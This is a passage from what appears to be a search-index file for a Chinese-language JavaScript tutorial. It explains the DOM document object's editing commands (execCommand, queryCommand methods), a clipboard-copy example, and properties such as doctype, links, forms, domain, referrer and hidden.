\uff0c\u90a3\u4e48\u8be5\u5143\u7d20\u53ef\u7f16\u8f91\u3002\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528 document.execCommand() \u65b9\u6cd5\uff0c\u6539\u53d8\u5185\u5bb9\u7684\u6837\u5f0f\uff0c\u6bd4\u5982 document.execCommand('bold') \u4f1a\u4f7f\u5f97\u5b57\u4f53\u52a0\u7c97\u3002 1 document . execCommand ( command , showDefaultUI , input ) \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002 command \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6240\u8981\u5b9e\u65bd\u7684\u6837\u5f0f\u3002 showDefaultUI \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u8981\u4f7f\u7528\u9ed8\u8ba4\u7684\u7528\u6237\u754c\u9762\uff0c\u5efa\u8bae\u603b\u662f\u8bbe\u4e3a false \u3002 input \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u6837\u5f0f\u7684\u8f85\u52a9\u5185\u5bb9\uff0c\u6bd4\u5982\u751f\u6210\u8d85\u7ea7\u94fe\u63a5\u65f6\uff0c\u8fd9\u4e2a\u53c2\u6570\u5c31\u662f\u6240\u8981\u94fe\u63a5\u7684\u7f51\u5740\u3002\u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8bbe\u4e3a true \uff0c\u90a3\u4e48\u6d4f\u89c8\u5668\u4f1a\u5f39\u51fa\u63d0\u793a\u6846\uff0c\u8981\u6c42\u7528\u6237\u5728\u63d0\u793a\u6846\u8f93\u5165\u8be5\u53c2\u6570\u3002\u4f46\u662f\uff0c\u4e0d\u662f\u6240\u6709\u6d4f\u89c8\u5668\u90fd\u652f\u6301\u8fd9\u6837\u505a\uff0c\u4e3a\u4e86\u517c\u5bb9\u6027\uff0c\u8fd8\u662f\u9700\u8981\u81ea\u5df1\u90e8\u7f72\u83b7\u53d6\u8fd9\u4e2a\u53c2\u6570\u7684\u65b9\u5f0f\u3002 1 2 3 4 5 var url = window . prompt ( '\u8bf7\u8f93\u5165\u7f51\u5740' ); if ( url ) { document . execCommand ( 'createlink' , false , url ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u63d0\u793a\u7528\u6237\u8f93\u5165\u6240\u8981\u94fe\u63a5\u7684\u7f51\u5740\uff0c\u7136\u540e\u624b\u52a8\u751f\u6210\u8d85\u7ea7\u94fe\u63a5\u3002\u6ce8\u610f\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f false \uff0c\u8868\u793a\u6b64\u65f6\u4e0d\u9700\u8981\u81ea\u52a8\u5f39\u51fa\u63d0\u793a\u6846\u3002 document.execCommand() \u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\u3002\u5982\u679c\u4e3a false \uff0c\u8868\u793a\u8fd9\u4e2a\u65b9\u6cd5\u65e0\u6cd5\u751f\u6548\u3002 \u8fd9\u4e2a\u65b9\u6cd5\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\uff0c\u53ea\u5bf9\u9009\u4e2d\u7684\u5185\u5bb9\u751f\u6548\u3002\u5982\u679c\u6709\u591a\u4e2a\u5185\u5bb9\u53ef\u7f16\u8f91\u533a\u57df\uff0c\u90a3\u4e48\u53ea\u5bf9\u5f53\u524d\u7126\u70b9\u6240\u5728\u7684\u5143\u7d20\u751f\u6548\u3002 document.execCommand() \u65b9\u6cd5\u53ef\u4ee5\u6267\u884c\u7684\u6837\u5f0f\u6539\u53d8\u6709\u5f88\u591a\u79cd\uff0c\u4e0b\u9762\u662f\u5176\u4e2d\u7684\u4e00\u4e9b\uff1abold\u3001insertLineBreak\u3001selectAll\u3001createLink\u3001insertOrderedList\u3001subscript\u3001delete\u3001insertUnorderedList\u3001superscript\u3001formatBlock\u3001insertParagraph\u3001undo\u3001forwardDelete\u3001insertText\u3001unlink\u3001insertImage\u3001italic\u3001unselect\u3001insertHTML\u3001redo\u3002\u8fd9\u4e9b\u503c\u90fd\u53ef\u4ee5\u7528\u4f5c\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u5b83\u4eec\u7684\u542b\u4e49\u4e0d\u96be\u4ece\u5b57\u9762\u4e0a\u770b\u51fa\u6765\u3002 \uff082\uff09document.queryCommandSupported() document.queryCommandSupported() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u662f\u5426\u652f\u6301 document.execCommand() \u7684\u67d0\u4e2a\u547d\u4ee4\u3002 1 2 3 if ( document . queryCommandSupported ( 'SelectAll' )) { console . log ( '\u6d4f\u89c8\u5668\u652f\u6301\u9009\u4e2d\u53ef\u7f16\u8f91\u533a\u57df\u7684\u6240\u6709\u5185\u5bb9' ); } \uff083\uff09document.queryCommandEnabled() document.queryCommandEnabled() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u662f\u5426\u53ef\u7528 document.execCommand() \u7684\u67d0\u4e2a\u547d\u4ee4\u3002\u6bd4\u5982\uff0c bold \uff08\u52a0\u7c97\uff09\u547d\u4ee4\u53ea\u6709\u5b58\u5728\u6587\u672c\u9009\u4e2d\u65f6\u624d\u53ef\u7528\uff0c\u5982\u679c\u6ca1\u6709\u9009\u4e2d\u6587\u672c\uff0c\u5c31\u4e0d\u53ef\u7528\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // HTML \u4ee3\u7801\u4e3a // <input type=\"button\" value=\"Copy\" onclick=\"doCopy()\"> function doCopy (){ // \u6d4f\u89c8\u5668\u662f\u5426\u652f\u6301 copy \u547d\u4ee4\uff08\u9009\u4e2d\u5185\u5bb9\u590d\u5236\u5230\u526a\u8d34\u677f\uff09 if ( document . queryCommandSupported ( 'copy' )) { copyText ( '\u4f60\u597d' ); } else { console . log ( '\u6d4f\u89c8\u5668\u4e0d\u652f\u6301' ); } } function copyText ( text ) { var input = document . createElement ( 'textarea' ); document . body . appendChild ( input ); input . value = text ; input . focus (); input . select (); // \u5f53\u524d\u662f\u5426\u6709\u9009\u4e2d\u6587\u5b57 if ( document . queryCommandEnabled ( 'copy' )) { var success = document . execCommand ( 'copy' ); input . remove (); console . log ( 'Copy Ok' ); } else { console . log ( 'queryCommandEnabled is false' ); } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u5224\u65ad\u6d4f\u89c8\u5668\u662f\u5426\u652f\u6301 copy \u547d\u4ee4\uff08\u5141\u8bb8\u53ef\u7f16\u8f91\u533a\u57df\u7684\u9009\u4e2d\u5185\u5bb9\uff0c\u590d\u5236\u5230\u526a\u8d34\u677f\uff09\uff0c\u5982\u679c\u652f\u6301\uff0c\u5c31\u65b0\u5efa\u4e00\u4e2a\u4e34\u65f6\u6587\u672c\u6846\uff0c\u91cc\u9762\u5199\u5165\u5185\u5bb9\u201c\u4f60\u597d\u201d\uff0c\u5e76\u5c06\u5176\u9009\u4e2d\u3002\u7136\u540e\uff0c\u5224\u65ad\u662f\u5426\u9009\u4e2d\u6210\u529f\uff0c\u5982\u679c\u6210\u529f\uff0c\u5c31\u5c06\u201c\u4f60\u597d\u201d\u590d\u5236\u5230\u526a\u8d34\u677f\uff0c\u518d\u5220\u9664\u90a3\u4e2a\u4e34\u65f6\u6587\u672c\u6846\u3002 document.getSelection() \u00b6 \u8fd9\u4e2a\u65b9\u6cd5\u6307\u5411 window.getSelection() \uff0c\u53c2\u89c1 window \u5bf9\u8c61\u4e00\u8282\u7684\u4ecb\u7ecd\u3002","title":"Document \u8282\u70b9"},{"location":"dom/document/#document","text":"","title":"Document \u8282\u70b9"},{"location":"dom/document/#_1","text":"document \u8282\u70b9\u5bf9\u8c61\u4ee3\u8868\u6574\u4e2a\u6587\u6863\uff0c\u6bcf\u5f20\u7f51\u9875\u90fd\u6709\u81ea\u5df1\u7684 document \u5bf9\u8c61\u3002 window.document \u5c5e\u6027\u5c31\u6307\u5411\u8fd9\u4e2a\u5bf9\u8c61\u3002\u53ea\u8981\u6d4f\u89c8\u5668\u5f00\u59cb\u8f7d\u5165 HTML \u6587\u6863\uff0c\u8be5\u5bf9\u8c61\u5c31\u5b58\u5728\u4e86\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u3002 document \u5bf9\u8c61\u6709\u4e0d\u540c\u7684\u529e\u6cd5\u53ef\u4ee5\u83b7\u53d6\u3002 \u6b63\u5e38\u7684\u7f51\u9875\uff0c\u76f4\u63a5\u4f7f\u7528 document \u6216 window.document \u3002 iframe \u6846\u67b6\u91cc\u9762\u7684\u7f51\u9875\uff0c\u4f7f\u7528 iframe \u8282\u70b9\u7684 contentDocument \u5c5e\u6027\u3002 Ajax \u64cd\u4f5c\u8fd4\u56de\u7684\u6587\u6863\uff0c\u4f7f\u7528 XMLHttpRequest \u5bf9\u8c61\u7684 responseXML \u5c5e\u6027\u3002 \u5185\u90e8\u8282\u70b9\u7684 ownerDocument \u5c5e\u6027\u3002 document \u5bf9\u8c61\u7ee7\u627f\u4e86 EventTarget \u63a5\u53e3\u548c Node \u63a5\u53e3\uff0c\u5e76\u4e14\u6df7\u5165\uff08mixin\uff09\u4e86 ParentNode \u63a5\u53e3\u3002\u8fd9\u610f\u5473\u7740\uff0c\u8fd9\u4e9b\u63a5\u53e3\u7684\u65b9\u6cd5\u90fd\u53ef\u4ee5\u5728 document \u5bf9\u8c61\u4e0a\u8c03\u7528\u3002\u9664\u6b64\u4e4b\u5916\uff0c document \u5bf9\u8c61\u8fd8\u6709\u5f88\u591a\u81ea\u5df1\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002","title":"\u6982\u8ff0"},{"location":"dom/document/#_2","text":"","title":"\u5c5e\u6027"},{"location":"dom/document/#_3","text":"\u4ee5\u4e0b\u5c5e\u6027\u662f\u6307\u5411\u6587\u6863\u5185\u90e8\u7684\u67d0\u4e2a\u8282\u70b9\u7684\u5feb\u6377\u65b9\u5f0f\u3002 \uff081\uff09document.defaultView document.defaultView \u5c5e\u6027\u8fd4\u56de document \u5bf9\u8c61\u6240\u5c5e\u7684 window \u5bf9\u8c61\u3002\u5982\u679c\u5f53\u524d\u6587\u6863\u4e0d\u5c5e\u4e8e window \u5bf9\u8c61\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 1 document . defaultView === window // true \uff082\uff09document.doctype \u5bf9\u4e8e HTML \u6587\u6863\u6765\u8bf4\uff0c document \u5bf9\u8c61\u4e00\u822c\u6709\u4e24\u4e2a\u5b50\u8282\u70b9\u3002\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u662f document.doctype \uff0c\u6307\u5411 <DOCTYPE> \u8282\u70b9\uff0c\u5373\u6587\u6863\u7c7b\u578b\uff08Document Type Declaration\uff0c\u7b80\u5199DTD\uff09\u8282\u70b9\u3002HTML \u7684\u6587\u6863\u7c7b\u578b\u8282\u70b9\uff0c\u4e00\u822c\u5199\u6210 <!DOCTYPE html> \u3002\u5982\u679c\u7f51\u9875\u6ca1\u6709\u58f0\u660e DTD\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 1 2 3 var doctype = document . doctype ; doctype // \"<!DOCTYPE html>\" doctype . name // \"html\" document.firstChild \u901a\u5e38\u5c31\u8fd4\u56de\u8fd9\u4e2a\u8282\u70b9\u3002 \uff083\uff09document.documentElement document.documentElement \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u6863\u7684\u6839\u5143\u7d20\u8282\u70b9\uff08root\uff09\u3002\u5b83\u901a\u5e38\u662f document \u8282\u70b9\u7684\u7b2c\u4e8c\u4e2a\u5b50\u8282\u70b9\uff0c\u7d27\u8ddf\u5728 document.doctype \u8282\u70b9\u540e\u9762\u3002HTML\u7f51\u9875\u7684\u8be5\u5c5e\u6027\uff0c\u4e00\u822c\u662f <html> \u8282\u70b9\u3002 \uff084\uff09document.body\uff0cdocument.head document.body \u5c5e\u6027\u6307\u5411 <body> \u8282\u70b9\uff0c document.head \u5c5e\u6027\u6307\u5411 <head> \u8282\u70b9\u3002 \u8fd9\u4e24\u4e2a\u5c5e\u6027\u603b\u662f\u5b58\u5728\u7684\uff0c\u5982\u679c\u7f51\u9875\u6e90\u7801\u91cc\u9762\u7701\u7565\u4e86 <head> \u6216 <body> \uff0c\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u521b\u5efa\u3002\u53e6\u5916\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u662f\u53ef\u5199\u7684\uff0c\u5982\u679c\u6539\u5199\u5b83\u4eec\u7684\u503c\uff0c\u76f8\u5f53\u4e8e\u79fb\u9664\u6240\u6709\u5b50\u8282\u70b9\u3002 \uff085\uff09document.scrollingElement document.scrollingElement \u5c5e\u6027\u8fd4\u56de\u6587\u6863\u7684\u6eda\u52a8\u5143\u7d20\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u6587\u6863\u6574\u4f53\u6eda\u52a8\u65f6\uff0c\u5230\u5e95\u662f\u54ea\u4e2a\u5143\u7d20\u5728\u6eda\u52a8\u3002 \u6807\u51c6\u6a21\u5f0f\u4e0b\uff0c\u8fd9\u4e2a\u5c5e\u6027\u8fd4\u56de\u7684\u6587\u6863\u7684\u6839\u5143\u7d20 document.documentElement \uff08\u5373 <html> \uff09\u3002\u517c\u5bb9\uff08quirk\uff09\u6a21\u5f0f\u4e0b\uff0c\u8fd4\u56de\u7684\u662f <body> \u5143\u7d20\uff0c\u5982\u679c\u8be5\u5143\u7d20\u4e0d\u5b58\u5728\uff0c\u8fd4\u56de null \u3002 1 2 // \u9875\u9762\u6eda\u52a8\u5230\u6d4f\u89c8\u5668\u9876\u90e8 document . scrollingElement . scrollTop = 0 ; \uff086\uff09document.activeElement document.activeElement \u5c5e\u6027\u8fd4\u56de\u83b7\u5f97\u5f53\u524d\u7126\u70b9\uff08focus\uff09\u7684 DOM \u5143\u7d20\u3002\u901a\u5e38\uff0c\u8fd9\u4e2a\u5c5e\u6027\u8fd4\u56de\u7684\u662f <input> \u3001 <textarea> \u3001 <select> \u7b49\u8868\u5355\u5143\u7d20\uff0c\u5982\u679c\u5f53\u524d\u6ca1\u6709\u7126\u70b9\u5143\u7d20\uff0c\u8fd4\u56de <body> \u5143\u7d20\u6216 null \u3002 \uff087\uff09document.fullscreenElement document.fullscreenElement \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u4ee5\u5168\u5c4f\u72b6\u6001\u5c55\u793a\u7684 DOM \u5143\u7d20\u3002\u5982\u679c\u4e0d\u662f\u5168\u5c4f\u72b6\u6001\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 1 2 3 if ( document . fullscreenElement . nodeName == 'VIDEO' ) { console . log ( '\u5168\u5c4f\u64ad\u653e\u89c6\u9891' ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u901a\u8fc7 document.fullscreenElement \u53ef\u4ee5\u77e5\u9053 <video> \u5143\u7d20\u6709\u6ca1\u6709\u5904\u5728\u5168\u5c4f\u72b6\u6001\uff0c\u4ece\u800c\u5224\u65ad\u7528\u6237\u884c\u4e3a\u3002","title":"\u5feb\u6377\u65b9\u5f0f\u5c5e\u6027"},{"location":"dom/document/#_4","text":"\u4ee5\u4e0b\u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a HTMLCollection \u5b9e\u4f8b\uff0c\u8868\u793a\u6587\u6863\u5185\u90e8\u7279\u5b9a\u5143\u7d20\u7684\u96c6\u5408\u3002\u8fd9\u4e9b\u96c6\u5408\u90fd\u662f\u52a8\u6001\u7684\uff0c\u539f\u8282\u70b9\u6709\u4efb\u4f55\u53d8\u5316\uff0c\u7acb\u523b\u4f1a\u53cd\u6620\u5728\u96c6\u5408\u4e2d\u3002 \uff081\uff09document.links document.links \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u6863\u6240\u6709\u8bbe\u5b9a\u4e86 href \u5c5e\u6027\u7684 <a> \u53ca <area> \u8282\u70b9\u3002 1 2 3 4 5 // \u6253\u5370\u6587\u6863\u6240\u6709\u7684\u94fe\u63a5 var links = document . links ; for ( var i = 0 ; i < links . length ; i ++ ) { console . log ( links [ i ]); } \uff082\uff09document.forms document.forms \u5c5e\u6027\u8fd4\u56de\u6240\u6709 <form> \u8868\u5355\u8282\u70b9\u3002 1 var selectForm = document . forms [ 0 ]; \u4e0a\u9762\u4ee3\u7801\u83b7\u53d6\u6587\u6863\u7b2c\u4e00\u4e2a\u8868\u5355\u3002 \u9664\u4e86\u4f7f\u7528\u4f4d\u7f6e\u5e8f\u53f7\uff0c id \u5c5e\u6027\u548c name \u5c5e\u6027\u4e5f\u53ef\u4ee5\u7528\u6765\u5f15\u7528\u8868\u5355\u3002 1 2 3 4 5 /* HTML \u4ee3\u7801\u5982\u4e0b <form name=\"foo\" id=\"bar\"></form> */ document . forms [ 0 ] === document . forms . foo // true document . forms . bar === document . forms . foo // true \uff083\uff09document.images document.images \u5c5e\u6027\u8fd4\u56de\u9875\u9762\u6240\u6709 <img> \u56fe\u7247\u8282\u70b9\u3002 1 2 3 4 5 6 7 var imglist = document . images ; for ( var i = 0 ; i < imglist . length ; i ++ ) { if ( imglist [ i ]. src === 'banner.gif' ) { // ... } } \u4e0a\u9762\u4ee3\u7801\u5728\u6240\u6709 img \u6807\u7b7e\u4e2d\uff0c\u5bfb\u627e\u67d0\u5f20\u56fe\u7247\u3002 \uff084\uff09document.embeds\uff0cdocument.plugins document.embeds \u5c5e\u6027\u548c document.plugins \u5c5e\u6027\uff0c\u90fd\u8fd4\u56de\u6240\u6709 <embed> \u8282\u70b9\u3002 \uff085\uff09document.scripts document.scripts \u5c5e\u6027\u8fd4\u56de\u6240\u6709 <script> \u8282\u70b9\u3002 1 2 3 4 var scripts = document . scripts ; if ( scripts . length !== 0 ) { console . log ( '\u5f53\u524d\u7f51\u9875\u6709\u811a\u672c' ); } \uff086\uff09document.styleSheets document.styleSheets \u5c5e\u6027\u8fd4\u56de\u7f51\u9875\u5185\u5d4c\u6216\u5f15\u5165\u7684 CSS \u6837\u5f0f\u8868\u96c6\u5408\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u8bf7\u770b\u300aCSS \u64cd\u4f5c\u300b\u4e00\u7ae0\u3002 \uff087\uff09\u5c0f\u7ed3 \u9664\u4e86 document.styleSheets \u5c5e\u6027\uff0c\u4ee5\u4e0a\u7684\u5176\u4ed6\u96c6\u5408\u5c5e\u6027\u8fd4\u56de\u7684\u90fd\u662f HTMLCollection \u5b9e\u4f8b\u3002 document.styleSheets \u5c5e\u6027\u8fd4\u56de\u7684\u662f StyleSheetList \u5b9e\u4f8b\u3002 1 2 3 4 5 document . links instanceof HTMLCollection // true document . images instanceof HTMLCollection // true document . forms instanceof HTMLCollection // true document . embeds instanceof HTMLCollection // true document . scripts instanceof HTMLCollection // true HTMLCollection \u5b9e\u4f8b\u662f\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6240\u4ee5\u4e0a\u9762\u8fd9\u4e9b\u5c5e\u6027\u90fd\u6709 length \u5c5e\u6027\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u5f15\u7528\u6210\u5458\u3002\u5982\u679c\u6210\u5458\u6709 id \u6216 name \u5c5e\u6027\uff0c\u8fd8\u53ef\u4ee5\u7528\u8fd9\u4e24\u4e2a\u5c5e\u6027\u7684\u503c\uff0c\u5728 HTMLCollection \u5b9e\u4f8b\u4e0a\u5f15\u7528\u5230\u8fd9\u4e2a\u6210\u5458\u3002 1 2 3 // HTML \u4ee3\u7801\u5982\u4e0b // <form name=\"myForm\"> document . myForm === document . forms . myForm // true","title":"\u8282\u70b9\u96c6\u5408\u5c5e\u6027"},{"location":"dom/document/#_5","text":"\u4ee5\u4e0b\u5c5e\u6027\u8fd4\u56de\u6587\u6863\u4fe1\u606f\u3002 \uff081\uff09document.documentURI\uff0cdocument.URL document.documentURI \u5c5e\u6027\u548c document.URL \u5c5e\u6027\u90fd\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6587\u6863\u7684\u7f51\u5740\u3002\u4e0d\u540c\u4e4b\u5904\u662f\u5b83\u4eec\u7ee7\u627f\u81ea\u4e0d\u540c\u7684\u63a5\u53e3\uff0c documentURI \u7ee7\u627f\u81ea Document \u63a5\u53e3\uff0c\u53ef\u7528\u4e8e\u6240\u6709\u6587\u6863\uff1b URL \u7ee7\u627f\u81ea HTMLDocument \u63a5\u53e3\uff0c\u53ea\u80fd\u7528\u4e8e HTML \u6587\u6863\u3002 1 2 3 4 5 document . URL // http://www.example.com/about document . documentURI === document . URL // true \u5982\u679c\u6587\u6863\u7684\u951a\u70b9\uff08 #anchor \uff09\u53d8\u5316\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u4f1a\u8ddf\u7740\u53d8\u5316\u3002 \uff082\uff09document.domain document.domain \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u6863\u7684\u57df\u540d\uff0c\u4e0d\u5305\u542b\u534f\u8bae\u548c\u7aef\u53e3\u3002\u6bd4\u5982\uff0c\u7f51\u9875\u7684\u7f51\u5740\u662f http://www.example.com:80/hello.html \uff0c\u90a3\u4e48 document.domain \u5c5e\u6027\u5c31\u7b49\u4e8e www.example.com \u3002\u5982\u679c\u65e0\u6cd5\u83b7\u53d6\u57df\u540d\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 document.domain \u57fa\u672c\u4e0a\u662f\u4e00\u4e2a\u53ea\u8bfb\u5c5e\u6027\uff0c\u53ea\u6709\u4e00\u79cd\u60c5\u51b5\u9664\u5916\u3002\u6b21\u7ea7\u57df\u540d\u7684\u7f51\u9875\uff0c\u53ef\u4ee5\u628a document.domain \u8bbe\u4e3a\u5bf9\u5e94\u7684\u4e0a\u7ea7\u57df\u540d\u3002\u6bd4\u5982\uff0c\u5f53\u524d\u57df\u540d\u662f a.sub.example.com \uff0c\u5219 document.domain \u5c5e\u6027\u53ef\u4ee5\u8bbe\u7f6e\u4e3a sub.example.com \uff0c\u4e5f\u53ef\u4ee5\u8bbe\u4e3a example.com \u3002\u4fee\u6539\u540e\uff0c document.domain \u76f8\u540c\u7684\u4e24\u4e2a\u7f51\u9875\uff0c\u53ef\u4ee5\u8bfb\u53d6\u5bf9\u65b9\u7684\u8d44\u6e90\uff0c\u6bd4\u5982\u8bbe\u7f6e\u7684 Cookie\u3002 \u53e6\u5916\uff0c\u8bbe\u7f6e document.domain \u4f1a\u5bfc\u81f4\u7aef\u53e3\u88ab\u6539\u6210 null \u3002\u56e0\u6b64\uff0c\u5982\u679c\u901a\u8fc7\u8bbe\u7f6e document.domain \u6765\u8fdb\u884c\u901a\u4fe1\uff0c\u53cc\u65b9\u7f51\u9875\u90fd\u5fc5\u987b\u8bbe\u7f6e\u8fd9\u4e2a\u503c\uff0c\u624d\u80fd\u4fdd\u8bc1\u7aef\u53e3\u76f8\u540c\u3002 \uff083\uff09document.location Location \u5bf9\u8c61\u662f\u6d4f\u89c8\u5668\u63d0\u4f9b\u7684\u539f\u751f\u5bf9\u8c61\uff0c\u63d0\u4f9b URL \u76f8\u5173\u7684\u4fe1\u606f\u548c\u64cd\u4f5c\u65b9\u6cd5\u3002\u901a\u8fc7 window.location \u548c document.location \u5c5e\u6027\uff0c\u53ef\u4ee5\u62ff\u5230\u8fd9\u4e2a\u5bf9\u8c61\u3002 \u5173\u4e8e\u8fd9\u4e2a\u5bf9\u8c61\u7684\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u8bf7\u770b\u300a\u6d4f\u89c8\u5668\u6a21\u578b\u300b\u90e8\u5206\u7684\u300aLocation \u5bf9\u8c61\u300b\u7ae0\u8282\u3002 \uff084\uff09document.lastModified document.lastModified \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6587\u6863\u6700\u540e\u4fee\u6539\u7684\u65f6\u95f4\u3002\u4e0d\u540c\u6d4f\u89c8\u5668\u7684\u8fd4\u56de\u503c\uff0c\u65e5\u671f\u683c\u5f0f\u662f\u4e0d\u4e00\u6837\u7684\u3002 1 2 document . lastModified // \"03/07/2018 11:18:27\" \u6ce8\u610f\uff0c document.lastModified \u5c5e\u6027\u7684\u503c\u662f\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u7528\u6765\u6bd4\u8f83\u3002 Date.parse \u65b9\u6cd5\u5c06\u5176\u8f6c\u4e3a Date \u5b9e\u4f8b\uff0c\u624d\u80fd\u6bd4\u8f83\u4e24\u4e2a\u7f51\u9875\u3002 1 2 3 4 var lastVisitedDate = Date . parse ( '01/01/2018' ); if ( Date . parse ( document . lastModified ) > lastVisitedDate ) { console . log ( '\u7f51\u9875\u5df2\u7ecf\u53d8\u66f4' ); } \u5982\u679c\u9875\u9762\u4e0a\u6709 JavaScript \u751f\u6210\u7684\u5185\u5bb9\uff0c document.lastModified \u5c5e\u6027\u8fd4\u56de\u7684\u603b\u662f\u5f53\u524d\u65f6\u95f4\u3002 \uff085\uff09document.title document.title \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u6863\u7684\u6807\u9898\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8fd4\u56de <title> \u8282\u70b9\u7684\u503c\u3002\u4f46\u662f\u8be5\u5c5e\u6027\u662f\u53ef\u5199\u7684\uff0c\u4e00\u65e6\u88ab\u4fee\u6539\uff0c\u5c31\u8fd4\u56de\u4fee\u6539\u540e\u7684\u503c\u3002 1 2 document . title = '\u65b0\u6807\u9898' ; document . title // \"\u65b0\u6807\u9898\" \uff086\uff09document.characterSet document.characterSet \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u6863\u7684\u7f16\u7801\uff0c\u6bd4\u5982 UTF-8 \u3001 ISO-8859-1 \u7b49\u7b49\u3002 \uff087\uff09document.referrer document.referrer \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6587\u6863\u7684\u8bbf\u95ee\u8005\u6765\u81ea\u54ea\u91cc\u3002 1 2 document . referrer // \"https://example.com/path\" \u5982\u679c\u65e0\u6cd5\u83b7\u53d6\u6765\u6e90\uff0c\u6216\u8005\u7528\u6237\u76f4\u63a5\u952e\u5165\u7f51\u5740\u800c\u4e0d\u662f\u4ece\u5176\u4ed6\u7f51\u9875\u70b9\u51fb\u8fdb\u5165\uff0c document.referrer \u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\u3002 document.referrer \u7684\u503c\uff0c\u603b\u662f\u4e0e HTTP \u5934\u4fe1\u606f\u7684 Referer \u5b57\u6bb5\u4fdd\u6301\u4e00\u81f4\u3002\u4f46\u662f\uff0c document.referrer \u7684\u62fc\u5199\u6709\u4e24\u4e2a r \uff0c\u800c\u5934\u4fe1\u606f\u7684 Referer \u5b57\u6bb5\u53ea\u6709\u4e00\u4e2a r \u3002 \uff088\uff09document.dir document.dir \u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6587\u5b57\u65b9\u5411\u3002\u5b83\u53ea\u6709\u4e24\u4e2a\u53ef\u80fd\u7684\u503c\uff1a rtl \u8868\u793a\u6587\u5b57\u4ece\u53f3\u5230\u5de6\uff0c\u963f\u62c9\u4f2f\u6587\u662f\u8fd9\u79cd\u65b9\u5f0f\uff1b ltr \u8868\u793a\u6587\u5b57\u4ece\u5de6\u5230\u53f3\uff0c\u5305\u62ec\u82f1\u8bed\u548c\u6c49\u8bed\u5728\u5185\u7684\u5927\u591a\u6570\u6587\u5b57\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\u3002 \uff089\uff09document.compatMode compatMode \u5c5e\u6027\u8fd4\u56de\u6d4f\u89c8\u5668\u5904\u7406\u6587\u6863\u7684\u6a21\u5f0f\uff0c\u53ef\u80fd\u7684\u503c\u4e3a BackCompat \uff08\u5411\u540e\u517c\u5bb9\u6a21\u5f0f\uff09\u548c CSS1Compat \uff08\u4e25\u683c\u6a21\u5f0f\uff09\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u7f51\u9875\u4ee3\u7801\u7684\u7b2c\u4e00\u884c\u8bbe\u7f6e\u4e86\u660e\u786e\u7684 DOCTYPE \uff08\u6bd4\u5982 <!doctype html> \uff09\uff0c document.compatMode \u7684\u503c\u90fd\u4e3a CSS1Compat \u3002","title":"\u6587\u6863\u9759\u6001\u4fe1\u606f\u5c5e\u6027"},{"location":"dom/document/#_6","text":"\uff081\uff09document.hidden document.hidden \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u9875\u9762\u662f\u5426\u53ef\u89c1\u3002\u5982\u679c\u7a97\u53e3\u6700\u5c0f\u5316\u3001\u6d4f\u89c8\u5668\u5207\u6362\u4e86 Tab\uff0c\u90fd\u4f1a\u5bfc\u81f4\u5bfc\u81f4\u9875\u9762\u4e0d\u53ef\u89c1\uff0c\u4f7f\u5f97 document.hidden \u8fd4\u56de true \u3002 \u8fd9\u4e2a\u5c5e\u6027\u662f Page Visibility API 